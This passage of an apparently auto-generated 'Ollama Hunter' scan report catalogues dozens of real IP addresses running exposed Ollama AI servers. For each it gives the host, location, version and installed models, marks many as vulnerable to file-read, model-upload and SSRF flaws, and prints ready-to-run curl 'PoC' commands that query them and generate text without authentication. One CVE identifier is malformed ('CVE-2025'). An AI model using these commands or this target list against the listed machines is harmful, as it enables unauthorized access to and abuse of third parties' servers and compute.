curl -sk http://45.150.108.219:11434/

# List models
curl -sk http://45.150.108.219:11434/api/tags

# Generate text (test with deepseek-r1:14b)
curl -sk http://45.150.108.219:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:14b","prompt":"test","stream":false}'
```

### http://38.180.16.112:11434
- **Hosting:** 3NT SOLUTIONS LLP
- **Country:** Brazil / São Paulo
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:14b | 8491MB | 14B | F16 |
| qwen2.5:72b | 36242MB | 72B | Q5_K_M |
| gemma3:8.2b | 4867MB | 8.2B | Q8_0 |
| deepseek-r1:latest | 17835MB | 33B | Q8_0 |

#### PoC Commands
```bash
# Check running
curl -sk http://38.180.16.112:11434/

# List models
curl -sk http://38.180.16.112:11434/api/tags

# Generate text (test with deepseek-r1:14b)
curl -sk http://38.180.16.112:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:14b","prompt":"test","stream":false}'
```

### http://51.161.131.235:11434
- **Hosting:** OVH Australia PTY LTD
- **Country:** Australia / Sydney
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:latest | 17835MB | 33B | Q4_K_M |
| qwen2.5:72b | 36240MB | 72B | F16 |
| gemma3:8.2b | 4864MB | 8.2B | Q5_K_M |
| deepseek-r1:14b | 8489MB | 14B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://51.161.131.235:11434/

# List models
curl -sk http://51.161.131.235:11434/api/tags

# Generate text (test with deepseek-r1:latest)
curl -sk http://51.161.131.235:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:latest","prompt":"test","stream":false}'
```

### http://168.235.74.31:11434
- **Hosting:** RAMNODE
- **Country:** United States / Los Angeles
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| qwen2.5:72b | 36242MB | 72B | Q8_0 |
| deepseek-r1:latest | 17837MB | 33B | Q8_0 |
| deepseek-r1:14b | 8492MB | 14B | F16 |
| gemma3:8.2b | 4868MB | 8.2B | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://168.235.74.31:11434/

# List models
curl -sk http://168.235.74.31:11434/api/tags

# Generate text (test with qwen2.5:72b)
curl -sk http://168.235.74.31:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"qwen2.5:72b","prompt":"test","stream":false}'
```

### http://107.161.25.224:11434
- **Hosting:** RAMNODE
- **Country:** United States / Seattle
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| qwen2.5:72b | 36241MB | 72B | Q4_K_M |
| deepseek-r1:latest | 17837MB | 33B | Q4_K_M |
| gemma3:8.2b | 4865MB | 8.2B | F16 |
| deepseek-r1:14b | 8490MB | 14B | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://107.161.25.224:11434/

# List models
curl -sk http://107.161.25.224:11434/api/tags

# Generate text (test with qwen2.5:72b)
curl -sk http://107.161.25.224:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"qwen2.5:72b","prompt":"test","stream":false}'
```

### http://84.247.131.184:11434
- **Hosting:** Contabo GmbH
- **Country:** Germany / Düsseldorf
- **Version:** 0.5.7
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:8b | 4445MB | 8B | Q4_K_M |
| llama3.2:3b | 1926MB | 3B | Q4_K_M |
| qwen2.5:7b | 3923MB | 7B | Q4_K_M |
| mistral:7b | 3923MB | 7B | Q4_K_M |
| deepseek-r1:8b | 4445MB | 8B | Q4_K_M |
| nomic-embed-text:latest | 262MB | 137M | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://84.247.131.184:11434/

# List models
curl -sk http://84.247.131.184:11434/api/tags

# Generate text (test with llama3.1:8b)
curl -sk http://84.247.131.184:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:8b","prompt":"test","stream":false}'
```

### http://173.255.226.61:11434
- **Hosting:** Linode
- **Country:** United States / Cedar Knolls
- **Version:** 0.24.0
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:70b | 40228MB | 70.6B | Q4_K_M |
| llama3.1:8b-instruct-q8_0 | 4482MB | 8.0B | Q8_0 |
| nomic-embed-text | 261MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://173.255.226.61:11434/

# List models
curl -sk http://173.255.226.61:11434/api/tags

# Generate text (test with deepseek-r1:70b)
curl -sk http://173.255.226.61:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:70b","prompt":"test","stream":false}'
```

### http://133.4.188.41:11434
- **Hosting:** Japan Network Information Center
- **Country:** Japan / Tokyo
- **Version:** 0.3.12
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:8b | 4693MB | 8.0B | Q4_K_M |
| nomic-embed-text:latest | 262MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://133.4.188.41:11434/

# List models
curl -sk http://133.4.188.41:11434/api/tags

# Generate text (test with llama3.1:8b)
curl -sk http://133.4.188.41:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:8b","prompt":"test","stream":false}'
```

### http://38.180.44.128:11434
- **Hosting:** 3NT SOLUTIONS LLP
- **Country:** Estonia / Tallinn
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:14b | 8489MB | 14B | F16 |
| qwen2.5:72b | 36242MB | 72B | Q4_K_M |
| deepseek-r1:latest | 17837MB | 33B | F16 |
| gemma3:8.2b | 4866MB | 8.2B | Q8_0 |

#### PoC Commands
```bash
# Check running
curl -sk http://38.180.44.128:11434/

# List models
curl -sk http://38.180.44.128:11434/api/tags

# Generate text (test with deepseek-r1:14b)
curl -sk http://38.180.44.128:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:14b","prompt":"test","stream":false}'
```

### http://38.91.104.106:11434
- **Hosting:** Cogent Communications - IPENG
- **Country:** United States / Washington
- **Version:** 0.6.2
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:8b | 4445MB | 8.0B | Q4_0 |
| qwen2.5:7b | 4466MB | 7.6B | Q4_0 |
| codellama:13b | 7025MB | 13.0B | Q4_0 |

#### PoC Commands
```bash
# Check running
curl -sk http://38.91.104.106:11434/

# List models
curl -sk http://38.91.104.106:11434/api/tags

# Generate text (test with llama3.1:8b)
curl -sk http://38.91.104.106:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:8b","prompt":"test","stream":false}'
```

### http://103.112.163.93:11434
- **Hosting:** PT Cloud Teknologi Nusantara
- **Country:** Indonesia / Jakarta
- **Version:** 0.5.7
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:latest | 4445MB | 8.0B | Q4_0 |
| mistral:latest | 3923MB | 7.2B | Q4_0 |
| codellama:13b | 7025MB | 13B | Q4_0 |
| phi3:latest | 2282MB | 3.8B | Q4_K_M |
| nomic-embed-text:latest | 262MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://103.112.163.93:11434/

# List models
curl -sk http://103.112.163.93:11434/api/tags

# Generate text (test with llama3.1:latest)
curl -sk http://103.112.163.93:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:latest","prompt":"test","stream":false}'
```

### http://172.105.226.85:11434
- **Hosting:** Linode
- **Country:** Japan / Tokyo
- **Version:** 0.6.2
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:70b | 40228MB | 70.6B | Q4_K_M |
| llama3.1:8b-instruct-q8_0 | 4482MB | 8.0B | Q8_0 |
| nomic-embed-text | 261MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://172.105.226.85:11434/

# List models
curl -sk http://172.105.226.85:11434/api/tags

# Generate text (test with deepseek-r1:70b)
curl -sk http://172.105.226.85:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:70b","prompt":"test","stream":false}'
```

### http://81.4.125.240:11434
- **Hosting:** RamNode IP Space
- **Country:** Netherlands / Tilburg
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| qwen2.5:72b | 36244MB | 72B | Q5_K_M |
| deepseek-r1:latest | 17838MB | 33B | Q8_0 |
| deepseek-r1:14b | 8492MB | 14B | F16 |
| gemma3:8.2b | 4867MB | 8.2B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://81.4.125.240:11434/

# List models
curl -sk http://81.4.125.240:11434/api/tags

# Generate text (test with qwen2.5:72b)
curl -sk http://81.4.125.240:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"qwen2.5:72b","prompt":"test","stream":false}'
```

### http://107.191.102.246:11434
- **Hosting:** RAMNODE
- **Country:** United States / Atlanta
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:latest | 17836MB | 33B | F16 |
| gemma3:8.2b | 4868MB | 8.2B | Q8_0 |
| deepseek-r1:14b | 8489MB | 14B | Q8_0 |
| qwen2.5:72b | 36244MB | 72B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://107.191.102.246:11434/

# List models
curl -sk http://107.191.102.246:11434/api/tags

# Generate text (test with deepseek-r1:latest)
curl -sk http://107.191.102.246:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:latest","prompt":"test","stream":false}'
```

### http://172.105.168.50:11434
- **Hosting:** Linode
- **Country:** Australia / Sydney
- **Version:** 0.5.7
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.2:latest | 1926MB | 3.2B | Q4_K_M |
| qwen2.5:7b | 4466MB | 7.6B | Q4_K_M |
| deepseek-r1:latest | 4466MB | 7.6B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://172.105.168.50:11434/

# List models
curl -sk http://172.105.168.50:11434/api/tags

# Generate text (test with llama3.2:latest)
curl -sk http://172.105.168.50:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.2:latest","prompt":"test","stream":false}'
```

### http://49.212.157.177:11434
- **Hosting:** SAKURA Internet Inc.
- **Country:** Japan / Kobe
- **Version:** 0.3.12
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| llama3.1:8b | 4693MB | 8.0B | Q4_K_M |
| nomic-embed-text:latest | 262MB | 137M | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://49.212.157.177:11434/

# List models
curl -sk http://49.212.157.177:11434/api/tags

# Generate text (test with llama3.1:8b)
curl -sk http://49.212.157.177:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"llama3.1:8b","prompt":"test","stream":false}'
```

### http://38.180.22.86:11434
- **Hosting:** 3NT SOLUTIONS LLP
- **Country:** Italy / Milan
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| deepseek-r1:latest | 17837MB | 33B | Q5_K_M |
| gemma3:8.2b | 4864MB | 8.2B | Q8_0 |
| deepseek-r1:14b | 8490MB | 14B | F16 |
| qwen2.5:72b | 36242MB | 72B | F16 |

#### PoC Commands
```bash
# Check running
curl -sk http://38.180.22.86:11434/

# List models
curl -sk http://38.180.22.86:11434/api/tags

# Generate text (test with deepseek-r1:latest)
curl -sk http://38.180.22.86:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"deepseek-r1:latest","prompt":"test","stream":false}'
```

### http://176.107.181.163:11434
- **Hosting:** Zemlyaniy Dmitro Leonidovich
- **Country:** Ukraine / Kyiv
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ✅ PASSED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| qwen2.5:72b | 36244MB | 72B | Q8_0 |
| deepseek-r1:14b | 8491MB | 14B | Q8_0 |
| deepseek-r1:latest | 17837MB | 33B | Q4_K_M |
| gemma3:8.2b | 4865MB | 8.2B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://176.107.181.163:11434/

# List models
curl -sk http://176.107.181.163:11434/api/tags

# Generate text (test with qwen2.5:72b)
curl -sk http://176.107.181.163:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"qwen2.5:72b","prompt":"test","stream":false}'
```

### http://133.4.188.1:11434
- **Hosting:** Japan Network Information Center
- **Country:** Japan / Tokyo
- **Version:** 0.12.6
- **Generation test:** ❌ FAILED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| gemma3 | 3184MB | 4.3B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://133.4.188.1:11434/

# List models
curl -sk http://133.4.188.1:11434/api/tags

# Generate text (test with gemma3)
curl -sk http://133.4.188.1:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"gemma3","prompt":"test","stream":false}'
```

### http://71.6.177.232:11434
- **Hosting:** CARI.net
- **Country:** United States / San Diego
- **Version:** 0.1.46
- **⚠️ VULNERABLE to:** CVE-2024-39722, CVE-2024-39721, CVE-2025
  - CVE-2024-39722: Path Traversal in model manifests — allows reading arbitrary files (CRITICAL)
  - CVE-2024-39721: Unauthorized model upload — allows uploading malicious models (HIGH)
  - CVE-2025: SSRF through custom model imports (HIGH)
- **Generation test:** ❌ FAILED

#### PoC Commands
```bash
# Check running
curl -sk http://71.6.177.232:11434/

# List models
curl -sk http://71.6.177.232:11434/api/tags

```

### http://133.4.188.2:11434
- **Hosting:** Japan Network Information Center
- **Country:** Japan / Tokyo
- **Version:** 0.12.6
- **Generation test:** ❌ FAILED

| Model | Size | Params | Quant |
|-------|------|--------|-------|
| gemma3 | 3184MB | 4.3B | Q4_K_M |

#### PoC Commands
```bash
# Check running
curl -sk http://133.4.188.2:11434/

# List models
curl -sk http://133.4.188.2:11434/api/tags

# Generate text (test with gemma3)
curl -sk http://133.4.188.2:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model":"gemma3","prompt":"test","stream":false}'
```

---
## 🟡 PROTECTED INSTANCES (AUTH REQUIRED)

- http://140.115.54.62:11434 (Ministry of Education Computer Center) — 401 Unauthorized
- http://116.142.76.131:11434 (China United Network Communications Corporation Limited) — 401 Unauthorized
- http://82.64.199.159:11434 (Free SAS) — 401 Unauthorized
- http://130.61.196.102:11434 (Oracle Public Cloud) — 401 Unauthorized
- http://188.103.72.213:11434 (ARCOR AG) — 401 Unauthorized
- http://45.92.8.37:11434 (Contabo GmbH) — 401 Unauthorized
- http://161.132.41.72:11434 (Red Cientifica Peruana) — 401 Unauthorized
- http://51.91.107.11:11434 (OVH SAS) — 401 Unauthorized

---
## ❌ DEAD / UNREACHABLE (10)

- http://209.15.123.75:11434 (CAT TELECOM, CAT Cloud Dept, 99 Chaengwatthana Rd. Lak Si, Bangkok 10210) — timed out
- http://104.238.151.233:11434 (Vultr Holdings, LLC) — timed out
- http://45.76.146.25:11434 (Vultr Holdings, LLC) — timed out
- http://40.160.67.162:11434 (OVH US LLC) — timed out
- http://194.195.126.123:11434 (Linode, LLC) — HTTP 400
- http://113.57.111.108:11434 (China Unicom HuBei Province Network) — timed out
- http://194.39.45.46:11434 (Rendszerinformatika Zrt.) — HTTP 400
- http://140.115.54.48:11434 (Ministry of Education Computer Center) — timed out
- http://76.229.156.176:11434 (AT&T Enterprises, LLC) — None
- http://130.110.18.2:11434 (Oracle Svenska AB) — timed out

---
*Report auto-generated by Ollama Hunter | 2026-07-12 14:57 UTC*